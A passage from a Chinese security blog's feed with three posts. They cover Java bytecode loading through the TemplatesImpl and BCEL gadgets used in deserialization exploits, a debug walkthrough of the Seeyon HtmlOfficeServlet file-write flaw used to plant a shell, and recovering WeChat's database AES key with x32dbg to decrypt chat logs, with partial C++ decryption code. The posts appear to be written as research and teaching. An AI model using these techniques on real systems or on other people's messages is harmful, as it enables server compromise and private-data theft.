punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置属性的值</span>        _name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token string">"reader-9l"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _bytecode<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _tfactory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// TemplatesImpl#newTransformer()   TemplatesImpl#getTransletInstance()   TemplatesImpl#defineTransletClasses()   TransletClassLoader#defineClass()   ClassLoader#defineClass()</span>        obj<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// getOutputProperties也能触发，因为里面的代码也是实现了newTransformer()</span>        <span class="token comment" spellcheck="true">// obj.getOutputProperties();</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/JavaZijiema/image-20211027204635431.png" alt="image-20211027204635431"></p><h2 id="0x05-Gadgets-7u21-调试过程-TemplatesImpl触发原理"><a href="#0x05-Gadgets-7u21-调试过程-TemplatesImpl触发原理" class="headerlink" title="0x05 Gadgets 7u21 调试过程 - TemplatesImpl触发原理"></a>0x05 Gadgets 7u21 调试过程 - TemplatesImpl触发原理</h2><p>TemplatesImpl#getOutputProperties也能触发，因为里面的代码也是实现了newTransformer()</p><p><img src="/img/JavaZijiema/image-20211028133450636.png" alt="image-20211028133450636"></p><p><strong>TemplatesImpl#getOutputProperties():↓</strong></p><p><img src="/img/JavaZijiema/image-20211028133230341.png" alt="image-20211028133230341"></p><p>也可以直接TemplatesImpl#newTransformer()</p><p><img src="/img/JavaZijiema/99f94f83-8a38-432b-8020-80bf81a7550b.png" alt="img"></p><p><strong>TemplatesImpl#newTransformer():↓</strong></p><p><code>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code></p><p>调用了TemplatesImpl#getTransletInstance()</p><p><img src="/img/JavaZijiema/c014d76a-2e25-4ccf-9ae1-99a5ae358833.png" alt="img"></p><p><strong>TemplatesImpl#getTransletInstance():↓</strong></p><p><code>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code></p><p><strong>因为要进入defineTransletClasses，那么<code>_name</code>属性的值不能为null，所以<code>_name</code>的值随便设置一个</strong></p><p>同理<code>_class</code>属性的值要为null，所以不用设置就行。</p><p><img src="/img/JavaZijiema/image-20211028133432371.png" alt="image-20211028133432371"></p><p>此时调用了TemplatesImpl#defineTransletClasses()</p><p><img src="/img/JavaZijiema/cfd32c13-3b1e-4835-b7b5-79369fea7f04.png" alt="img"></p><p><strong>TemplatesImpl#defineTransletClasses():↓</strong></p><p><code>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code></p><p><strong><code>_bytecode</code>不能为null，否则就抛出了异常，至于赋予什么值，后面会分析</strong></p><p><img src="/img/JavaZijiema/image-20211028140524831.png" alt="image-20211028140524831"></p><p>红框里的代码：</p><p><strong>TemplatesImpl类中的<code>_tfactory</code>变量需要有一个getExternalExtensionsMap方法，否则run方法就会报错从而程序中断，所以将<code>_tfactory</code>的值设置为TransformerFactoryImpl类。即<code>_tfactory.set(obj,new TransformerFactoryImpl());</code></strong></p><p><img src="/img/JavaZijiema/image-20211028140034876.png" alt="image-20211028140034876"></p><p>这是没给<code>_tfactory</code>赋值</p><p><img src="/img/JavaZijiema/image-20211028141033976.png" alt="image-20211028141033976"></p><p>运行报错了</p><p><img src="/img/JavaZijiema/image-20211028141816841.png" alt="image-20211028141816841"></p><p><strong>这里抛出一个疑问：</strong></p><p><code>_tfactory</code>赋值的类好像并不一定得要有getExternalExtensionsMap方法。同样能够触发~</p><p><img src="/img/JavaZijiema/image-20211028141858420.png" alt="image-20211028141858420"></p><p>回归主题：接下来就进入到了loader.defineClass里</p><p><img src="/img/JavaZijiema/70c4c8e2-af00-44ec-b132-ad5a156e2c83.png" alt="img"></p><p><strong>TransletClassLoader#defineClass():↓</strong></p><p><code>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code></p><p><img src="/img/JavaZijiema/10ec143a-9ffa-4c6f-981f-c9f868672508.png" alt="img"></p><p><strong>ClassLoader#defineClass():↓</strong></p><p><code>java/lang/ClassLoader.java</code></p><p>加载我们传递的字节码并生成对象。但是不会执行static代码。</p><p><img src="/img/JavaZijiema/cfc12d9c-c54d-4103-bb94-664c3403431f.png" alt="img"></p><p>接下来回到了<strong>TemplatesImpl#defineTransletClasses():↓</strong></p><p><code>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code></p><p><strong>这里获取<code>_bytecode</code>转换后的类的父类，然后判断父类是不是<code>AbstractTranslet</code>类，只有是的话，才能继续下去。</strong></p><p><img src="/img/JavaZijiema/image-20211028142344174.png" alt="image-20211028142344174"></p><p><strong>所以我们的恶意代码类必须要继承AbstractTranslet类</strong></p><p><img src="/img/JavaZijiema/image-20211028142631015.png" alt="image-20211028142631015"></p><p><strong>最后漏洞触发代码就是红框里的这一行，_transletIndex是在defineTransletClasses()中判断是不是AbstractTranslet子类时赋值的，然后实例化了<code>_bytecode</code>的类，执行了静态方法或者构造函数里的代码。</strong></p><p><img src="/img/JavaZijiema/image-20211028134542461.png" alt="image-20211028134542461"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>TemplatesImpl类的 <code>_name</code> 变量 != null，随便设置即可</li><li>TemplatesImpl类的<code>_class</code>变量 == null</li><li>TemplatesImpl类的 <code>_bytecodes</code> 变量 != null</li><li>TemplatesImpl类的<code>_bytecodes</code>是我们代码执行的类的字节码。<code>_bytecodes</code>中的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</li><li>我们需要执行的恶意代码写在<code>_bytecodes</code> 变量对应的类的静态方法或构造方法中。</li><li>TemplatesImpl类的<code>_tfactory</code>需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类</li></ol><h2 id="0x06-利用BCEL-ClassLoader加载字节码"><a href="#0x06-利用BCEL-ClassLoader加载字节码" class="headerlink" title="0x06.利用BCEL ClassLoader加载字节码"></a>0x06.利用BCEL ClassLoader加载字节码</h2><p>BCEL是一个用于分析、创建和操纵Java类文件的工具库</p><p>判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，使用<code>com.sun.org.apache.bcel.internal.classfile.Utility#decode</code>将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用<code>defineClass</code>注册解码后的类，一旦该类被加载就会触发类中的恶意代码。</p><p>DemoHelloWorld.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoBCEL<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoHelloWorld</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">Hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"String"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DemoBCELBytes.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoBCEL<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span>JavaClass<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span>Utility<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>Repository<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoBCELBytes</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String <span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Repository 用于将一个Java Class先转换成原生字节码</span>        JavaClass cls <span class="token operator">=</span> Repository<span class="token punctuation">.</span><span class="token function">lookupClass</span><span class="token punctuation">(</span>DemoHelloWorld<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Utility 用于将原生的字节码转换成BCEL格式的字节码</span>        String code <span class="token operator">=</span> Utility<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到BCEL格式的字节码</p><p><img src="/img/JavaZijiema/image-20211027220644213.png" alt="image-20211027220644213"></p><p>DemoBCEL.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 成功</span><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoBCEL<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>Repository<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span>JavaClass<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span>Utility<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ClassLoader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoBCEL</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String <span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Class <span class="token class-name">testClass</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"$$BCEL$$"</span><span class="token operator">+</span><span class="token string">"$l$8b$I$A$A$A$A$A$A$A$7dQMO$c2$40$Q$7d$cbWK$5b$V$L$f8$85$ux$C$P$f6$e2$c5h$3c$88$g$P$8d$9a$60$f0$5c$60$83K$da$ae$v$c5$c4$7f$a5$k4$f1$e0$P$f0G$Z$a7$L$81$Y$8d$7b$98$d9yo$e6$ed$cc$ce$e7$d7$fb$H$80$7d$ec$Y$d0P$cc$a3$84$b2$8e$V$D$abX$d3$b1$aeaCC$85$nw$qB$R$l3$a4$h$cd$OC$a6$r$fb$9ca$c9$V$n$bf$i$H$5d$k$ddx$5d$9f$Q$db$95$3d$cf$efx$91H$e2$v$98$89$ef$c4$88$a1$ea$f6d$e0$9c$f2$40$9e$b4$ce$5cu$b9$e0$be$_oe$e4$f7$P$Z$b2$wb$u5$9a$ee$d0$7b$f0$i$df$L$HN$3b$8eD8$m$dah$cbq$d4$e3$e7$o$91$y$fe$ac$deK$f2$z$e8$c8k$d8$b4P$c5$W$83$a9$e8$9a$e25l$5b$a8$a1N$83L$f4$Y$w$ff4$c3P$987p$d5$j$f2$5e$fc$Dj$3f$8eb$k$d0g$c81$R$e5I$b7B$3a$d7$q$j$d3$D$dc$L$a8$e1$e2$l0$83v$9fD$7eHu$8d$dfc6$3b$a8$pG$9bHN$K$y$Z$89$acA$91C$9e$91$cf$ee$be$81$3d$x$da$q$9bS$60$g$WYk$92$80$F$y$92$a7$fd$a00$z$3ePb$80$f9$82$94$9d$7eE$c6$ce$3e$cd$q$M$f2I$99Nbs$Zs$s$b3$ac2$edo$j$7b$b1$e5$x$C$A$A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span>        Object testInstance <span class="token operator">=</span> testClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 反射获取hello方法</span>        Method method <span class="token operator">=</span> testInstance<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 反射调用hello方法,等价于 String str = t.hello();</span>        String str <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>testInstance<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/JavaZijiema/image-20211027220704503.png" alt="image-20211027220704503"></p><h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><pre><code>JDK反序列化Gadgets 7u21    https://xz.aliyun.com/t/6884双亲委派机制    https://www.cnblogs.com/nice0e3/p/13719903.html/</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java动态加载字节码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计之致远HtmlOfficeServlet漏洞分析</title>
      <link href="/2021/07/05/java-dai-ma-shen-ji-zhi-zhi-yuan-htmlofficeservlet-lou-dong-fen-xi/"/>
      <url>/2021/07/05/java-dai-ma-shen-ji-zhi-zhi-yuan-htmlofficeservlet-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Java代码审计之致远HtmlOfficeServlet漏洞分析"><a href="#Java代码审计之致远HtmlOfficeServlet漏洞分析" class="headerlink" title="Java代码审计之致远HtmlOfficeServlet漏洞分析"></a>Java代码审计之致远HtmlOfficeServlet漏洞分析</h1><p><img src="/img/SeeyonHtmlOfficeServlet/1ffb497e-588d-4b85-8b54-ce9ab63c9acd.png" alt="img"></p><p>command+单击，跟进到jar包里的HtmlOfficeServlet.class文件，对doGet方法的第一行打断点</p><p><img src="/img/SeeyonHtmlOfficeServlet/b9413951-a489-496d-bb76-6758734be3f8.png" alt="img"></p><p>burp发包</p><p><img src="/img/SeeyonHtmlOfficeServlet/578a524b-c8ac-47af-b55d-0ea9f0b547e0.png" alt="img"></p><p>成功到了断点处</p><p><img src="/img/SeeyonHtmlOfficeServlet/148287b2-1703-4a1f-967b-f7a708273ffb.png" alt="img"></p><p>切换到Console标签，Mac会出现下面三个图标。</p><p>第一个是按照流程代码一行行的往下跑，遇见方法时不会进入该方法体内     等价于 F8 步过</p><p>第二个是如果有方法则进入方法内部      等价于 F7 步入</p><p>第三个是当前流程的代码块跑完，跳到上一层代码块    等价于 SHIFT+F8 步出</p><p><img src="/img/SeeyonHtmlOfficeServlet/c23fe177-a813-43cd-b01a-3e197799a7ca.jpg" alt="img"></p><p>按F9到下一个调试点，如果没有调试点了，则直接把程序跑完，burp那边就有响应包了。</p><p>第29、30行通过getBean获取实例化对象（handWriteManager、htmlHandWriteManager）</p><p>第31行实例化iMsgServer2000对象</p><p><img src="/img/SeeyonHtmlOfficeServlet/eb626e6b-d3ae-4b92-bad8-a7bb8205d4bb.png" alt="img"></p><p>第34行 handWriteManager.readVariant(request, msgObj); 从请求中获取传递的值</p><p><img src="/img/SeeyonHtmlOfficeServlet/7f37f229-9445-4c6c-b5b0-968cf6b760b0.png" alt="img"></p><p>选择第二个按钮，即F7步入  跟入到对应的handWriteManager.class文件里</p><p><img src="/img/SeeyonHtmlOfficeServlet/f1fb9749-8fda-4220-a329-6f0fcf9aaeb0.png" alt="img"></p><p>选择第一个按钮，即F8步过</p><p>例如 msgObj.GetMsgByName(“originalFileId”) 是读取请求包的originalFileId的值，并按照致远自定义的base64解码得到值</p><p>关于致远自定义的base64的编码和解码，后面会介绍如何自己实现</p><p><img src="/img/SeeyonHtmlOfficeServlet/0af0654c-275d-4751-a64a-830bf1f2d037.png" alt="img"></p><p><img src="/img/SeeyonHtmlOfficeServlet/66662841-0200-4f00-b217-01e4807df072.png" alt="img"></p><p>继续选择第一个按钮，即F8步过，此时程序运行完了readVariant，跳回到doGet代码块里，来到了下一行代码if判断语句里</p><p><img src="/img/SeeyonHtmlOfficeServlet/79c8dac5-2db5-4699-ad0c-fafc9b12e5a4.png" alt="img"></p><p>继续选择第一个按钮，即F8步过，获取OPTION的值，并base64解码后得到值为SAVEASIMG</p><p><img src="/img/SeeyonHtmlOfficeServlet/7343f8ce-043d-42d9-9b31-2da19dfa0e35.png" alt="img"></p><p>此时代码跳到了SAVEASIMG的if判断代码块里，获取FILENAME的值，并base64解码后得到值为自定义的shell的路径</p><p><img src="/img/SeeyonHtmlOfficeServlet/e4b536c9-c94a-4f72-9bc0-9303ad250b83.png" alt="img"></p><p>到MsgFileSave方法，传递参数值为shell的路径</p><p><img src="/img/SeeyonHtmlOfficeServlet/3e3a5eb9-947f-4789-96e1-e872b858c2e9.png" alt="img"></p><p>选择第二个按钮，即F7步入  跟入到对应的iMsgServer2000.class文件里的MsgFileSave方法</p><p>就是很简单的文件流写入内容</p><p><img src="/img/SeeyonHtmlOfficeServlet/c347b7bb-b71d-4972-af33-5c9ad388aba0.png" alt="img"></p><p>到这里就结束了。</p><p>这里注意的是POC里的666是要写入内容的长度，在Debug里也能看到共写入666长度的内容，如果少于666，则用null填充</p><p><img src="/img/SeeyonHtmlOfficeServlet/7054d686-ea4e-4715-bd1f-b19489b37ebe.png" alt="img"></p><p><img src="/img/SeeyonHtmlOfficeServlet/452b29aa-98d4-4b58-ba45-0b75b33d417c.png" alt="img"></p><p><img src="/img/SeeyonHtmlOfficeServlet/8a05b618-ad83-43d5-9759-32c996fcf027.png" alt="img"></p><p>参考链接</p><pre><code>https://cloud.tencent.com/developer/article/1817235</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 致远 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼与社工系列之某信聊天记录解密</title>
      <link href="/2021/06/15/diao-yu-yu-she-gong-xi-lie-zhi-wei-xin-liao-tian-ji-lu-jie-mi/"/>
      <url>/2021/06/15/diao-yu-yu-she-gong-xi-lie-zhi-wei-xin-liao-tian-ji-lu-jie-mi/</url>
      
        <content type="html"><![CDATA[<h1 id="微信聊天记录解密"><a href="#微信聊天记录解密" class="headerlink" title="微信聊天记录解密"></a>微信聊天记录解密</h1><p><strong>前言：该文是从网上各文章中东拼西凑出来的一篇纯复现文章，分享该文章目的是为了让没基础的朋友也能够复现。也请看到该篇文章的朋友严禁将该方法用于非授权的测试及非法用途，否则后果自负。</strong></p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><pre><code>0x01 逆向获取密钥0x02 解密本地数据库0x03 CE寻找密钥的基址0x04 实现获取动态密钥的代码0x05 实战0x06 总结0x07 参考链接</code></pre><h2 id="0x01-逆向获取密钥"><a href="#0x01-逆向获取密钥" class="headerlink" title="0x01 逆向获取密钥"></a>0x01 逆向获取密钥</h2><p>微信的数据库存储在本地</p><pre><code>好友微信id等各种信息存储在该目录下C:\Users\xxxxxx\Documents\WeChat Files\wxid_xxxxxxxxxx\Msg</code></pre><p><img src="/img/wechatDecrypt/cb583ea8-ef9b-4863-9b7d-8aecc2686ade.png" alt="img"></p><pre><code>和微信好友的聊天记录存储在multi目录下的MSG0.db数据库里C:\Users\xxxxxx\Documents\WeChat Files\wxid_xxxxxxxxxx\Msg\Multi</code></pre><p><img src="/img/wechatDecrypt/f2e6ca0e-21d0-4941-8924-7f1fee8b6018.png" alt="img"></p><p>解密这些数据库需要密钥，密钥是所有数据库共用同一个密钥，所以逆向的时候找到解密其中一个数据库时用的密钥即可。</p><p>至于如何找到这个密钥，因为这些数据库都是通过AES加密，而AES的密钥是32位的，32的十六位进制是20，所以在逆向的过程中重点关注20这个数字。</p><p>下面开始详细的寻找密钥过程，因为水平有限，所以跟着前辈的路线走，目的就是为了找到密钥是多少</p><p>从下面这篇文章中知道可以通过   open db fail=%d ,error=%s   这个字符串取定位到密钥附近的代码</p><p><img src="/img/wechatDecrypt/ff542cb4-95fa-44c1-a3ba-d66c3cfad16e.jpg" alt="img"></p><p>于是使用x32dbg去跟踪</p><p>使用x32dbg打开wechat.exe程序</p><p><img src="/img/wechatDecrypt/59063add-f202-4d66-a086-f7924bb85d4f.png" alt="img"></p><p>会弹出微信的登录框</p><p><img src="/img/wechatDecrypt/e6831483-e1ae-4313-850a-8f3695acd6f3.png" alt="img"></p><p>右键–&gt;搜索–&gt;所有模块–&gt;字符串</p><p><img src="/img/wechatDecrypt/4abbbe2a-7491-4c2f-be34-b7dd41d2f735.png" alt="img"></p><p>在引用的搜索框中输入  open db fail=%d ,error=%s</p><p><img src="/img/wechatDecrypt/476e5917-7dd4-4027-aa72-422adfd0ab67.png" alt="img"></p><p>选中这两行按F2设置断点</p><p><img src="/img/wechatDecrypt/6072f753-458d-4ac1-82a7-488a828a896b.png" alt="img"></p><p>根据文章中的说明对红框中的代码设置断点</p><p><img src="/img/wechatDecrypt/72eb9656-e420-4f39-9768-066775dc54e3.jpg" alt="img"></p><p>于是双击第一个断点，进入CPU页面，对je wechatwin.57A3DCDB设置断点</p><p><img src="/img/wechatDecrypt/432dabc8-9b04-473d-aa62-f0f875da9244.png" alt="img"></p><p>接下来重启</p><p><img src="/img/wechatDecrypt/7f566fc9-d3da-4fc9-8d77-17909308b0ed.png" alt="img"></p><p>双击登录</p><p><img src="/img/wechatDecrypt/b32fe909-2b4d-49c7-80ed-de7229b5df48.png" alt="img"></p><p>此时跳到了刚才断点处</p><p><img src="/img/wechatDecrypt/acde8fe8-60dc-4090-b8c9-0af2c892dbc4.png" alt="img"></p><p>按F7单步步进，进入到 cmp dword ptr ds:[ebx+30],0</p><p><img src="/img/wechatDecrypt/01a1a37f-03e7-4448-a3fc-6066fd40de74.png" alt="img"></p><p>往下翻，对红框的内容设置断点</p><p><img src="/img/wechatDecrypt/3c9ca3cf-947f-4ab5-8e8f-0d7e62caf4b9.png" alt="img"></p><p>按F9重新回到了一开始的断点处</p><p><img src="/img/wechatDecrypt/2f2f3f99-a473-42b6-a828-bf289e6224b9.png" alt="img"></p><p>继续按F9跳到了push eax，再按F9跳到push esi，然后查看eax的值</p><p><img src="/img/wechatDecrypt/e5c2fbd8-c6aa-4cce-9fcf-38e7e61df036.png" alt="img"></p><p>选中EAX的值，右键–&gt;在内存窗口中转到，可以看到下一个字节是数字20</p><p><img src="/img/wechatDecrypt/3651e57a-71dd-4f7b-aa9d-02bf9ceb5573.png" alt="img"></p><p>得到了密钥的地址：88 4D 88 04</p><p>接下来跳转到地址04884D88获取密钥的值</p><p>右键–&gt;转到–&gt;表达式</p><p><img src="/img/wechatDecrypt/9c913988-7bc1-4b12-ac2c-2004a0a455f5.png" alt="img"></p><p>输入刚才得到的地址04884D88</p><p><img src="/img/wechatDecrypt/35b17fbe-48a7-4da1-b339-7898818aaa5a.png" alt="img"></p><p>跳转过去后，取32个字节，即红框里的内容</p><pre><code>04884D88  6F 50 9B 68 38 4C 46 68 8B A0 8C 54 E1 0A DA 74  oP.h8LFh. .Tá.Út  04884D98  21 30 09 87 52 84 43 AF 8E CF C9 14 F4 DF 95 19  !0..R.C¯.ÏÉ.ôß..  </code></pre><p><img src="/img/wechatDecrypt/b405598f-be82-4caf-b50e-c15d26ca6394.png" alt="img"></p><p>此时密钥拿到了，接下来尝试解密</p><h2 id="0x02-解密本地数据库"><a href="#0x02-解密本地数据库" class="headerlink" title="0x02 解密本地数据库"></a>0x02 解密本地数据库</h2><p>需要安装老版本的openssl，下载地址：<a href="https://slproweb.com/download/Win32OpenSSL-1_0_2u.exe" target="_blank" rel="noopener">https://slproweb.com/download/Win32OpenSSL-1_0_2u.exe</a></p><p>默认安装就行</p><p><img src="/img/wechatDecrypt/83267491-d0e0-414f-93b7-c1d9a8ad9d1f.png" alt="img"></p><p>接下来需要配置解密代码的项目，用Visual Studio创建C++控制台应用</p><p>根据顺序将openssl的include添加进去</p><p><img src="/img/wechatDecrypt/a76b5eb7-6601-411a-bd6c-054ac21e4cbd.png" alt="img"></p><p>同理添加lib目录</p><p><img src="/img/wechatDecrypt/e640f313-288c-4659-ad14-0c8050d5ec2e.png" alt="img"></p><p>如上增加两个库名称</p><p><img src="/img/wechatDecrypt/3639d69e-632c-48a4-8a36-980f49836e21.png" alt="img"></p><p>配置如上设置就可以了，接下来编译代码，代码如下。每次修改pass里的密钥即可。</p><pre><code>using namespace std;#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &lt;openssl/rand.h&gt;#include &lt;openssl/evp.h&gt;#include &lt;openssl/aes.h&gt;#include &lt;openssl/hmac.h&gt;#undef _UNICODE#define SQLITE_FILE_HEADER &quot;SQLite format 3&quot; #define IV_SIZE 16#define HMAC_SHA1_SIZE 20#define KEY_SIZE 32#define SL3SIGNLEN 20#ifndef ANDROID_WECHAT#define DEFAULT_PAGESIZE 4096       //4048数据 + 16IV + 20 HMAC + 12#define DEFAULT_ITER 64000#else#define NO_USE_HMAC_SHA1#define DEFAULT_PAGESIZE 1024#define DEFAULT_ITER 4000#endif//pc端密码是经过OllyDbg得到的32位pass。unsigned char pass[] = { 0xba,0x9f,0x56,0x04,0xc7,0x6b,0x4a,0xd5,0x8c,0xf7,0xaa,0x46,0x78,0x2c,0x7f,0xb7,0x2b,0x03,0xc5,0xfd,0x00,0x10,0x41,0xdb,0x9a,0xd6,0x6b,0x5f,0x6b,0x16,0x28,0xe1 };char dbfilename[50];int Decryptdb();int CheckKey();int CheckAESKey();int main(int argc, char* argv[]){    if (argc &gt;= 2)    //第二个参数argv[1]是文件名        strcpy_s(dbfilename, argv[1]);  //复制               //没有提供文件名，则提示用户输入    else {        cout &lt;&lt; &quot;请输入文件名:&quot; &lt;&lt; endl;        cin &gt;&gt; dbfilename;    }    Decryptdb();    return 0;}int Decryptdb(){    FILE* fpdb;    fopen_s(&amp;fpdb, dbfilename, &quot;rb+&quot;);    if (!fpdb)    {        printf(&quot;打开文件错!&quot;);        getchar();        return 0;    }    